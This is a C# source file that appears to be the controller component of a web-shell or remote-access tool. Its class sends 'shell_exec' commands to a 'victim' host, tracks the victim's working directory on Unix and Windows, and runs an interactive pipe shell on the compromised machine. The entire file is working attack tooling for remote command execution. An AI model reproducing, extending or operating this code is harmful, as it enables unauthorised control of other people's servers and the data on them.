using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnShell : clsfnBase
    {
        private clsWeb m_web { get; set; }
        public string m_szCurrentDir { get; set; }
        public bool m_bIsRunning { get; set; } = false;

        private List<string> m_lsHistory = new List<string>();
        private int m_nIdx = 0;

        public clsfnShell(clsWeb web)
        {
            m_web = web;
            m_szCurrentDir = string.Empty;
        }

        public void fnPushCommand(string szCmd)
        {
            m_lsHistory.Add(szCmd);
            fnResetIndex();
        }

        private void fnResetIndex()
        {
            m_nIdx = m_lsHistory.Count - 1;
            if (m_nIdx < 0)
                m_nIdx = 0;
        }

        public string fnLastCommand()
        {
            if (m_lsHistory.Count == 0)
                return string.Empty;

            string szCmd = m_lsHistory[m_nIdx];
            
            m_nIdx--;
            if (m_nIdx < 0)
                m_nIdx = 0;

            return szCmd;
        }

        public string fnNextCommand()
        {
            if (m_lsHistory.Count == 0)
                return string.Empty;

            string szCmd = m_lsHistory[m_nIdx];

            m_nIdx++;
            if (m_nIdx >= m_lsHistory.Count)
                m_nIdx = m_lsHistory.Count - 1;

            return szCmd;
        }

        public async Task<string> fnShellExec(string szCommand)
        {
            string szResp = await m_web.fnszSendPayload("shell_exec", new string[] { szCommand, m_web.m_victim.ShellEncoding });

            fnPushCommand(szCommand);
            
            return szResp;
        }

        /// <summary>
        /// Execute shell command and return current directory and output.
        /// </summary>
        /// <param name="szCommand"></param>
        /// <returns></returns>
        public async Task<(string szCurrentDir, string szOutput)> fnShellExecute(string szCommand)
        {
            string szCurrentDir = string.Empty;
            string szOutput = string.Empty;

            string szSplitter = clsEzData.fnszGenerateRandomStr(15);

            if (m_web.m_victim.m_bUnixLike)
                szCurrentDir = $"cd \"{m_szCurrentDir}\" && {szCommand} && echo [{szSplitter}] && pwd";
            else
                szCurrentDir = $"cd /d \"{m_szCurrentDir}\" & {szCommand} & echo [{szSplitter}] & cd";

            string szResp = await m_web.fnszSendPayload("shell_exec", new string[] { szCurrentDir, m_web.m_victim.ShellEncoding });
            string[] asResp = szResp.Split($"[{szSplitter}]");
            
            if (asResp.Length == 2)
            {
                szOutput = asResp[0];
                szCurrentDir = asResp[1];

                m_szCurrentDir = szCurrentDir.Trim().Replace("\n", string.Empty).Replace(Environment.NewLine, string.Empty);
            }
            else
            {
                szOutput = szResp;
                szCurrentDir = m_szCurrentDir;
            }

            fnPushCommand(szCommand);

            return (szCurrentDir, szOutput);
        }

        public async Task fnPipeCreate(string szApp)
        {
            _ = Task.Run(async () =>
            {
                try
                {
                    await m_web.fnszSendPayload("shell_virtual", new string[] { "create", szApp });
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Pipe shell is terminated:\n" + ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
        }

        public async Task<bool> fnPipeWrite(string szB64Data)
        {
            try
            {
                if (!m_bIsRunning)
                    return false;

                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "write", szB64Data });
                return szResp.Contains("success");
            }
            catch
            {
                return false;
            }
        }

        public async Task<bool> fnPipeResize(string szCols, string szRows)
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "resize", szCols, szRows });
                return szResp.Contains("success");
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> fnPipeRead()
        {
            try
            {
                if (!m_bIsRunning)
                    return string.Empty;

                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "read" });
                return szResp;
            }
            catch
            {
                return string.Empty;
            }
        }

        public async Task<string> fnPipeStop()
        {
            try
            {
                string szResp = await m_web.fnszSendPayload("shell_virtual", new string[] { "stop" });
                return szResp;
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}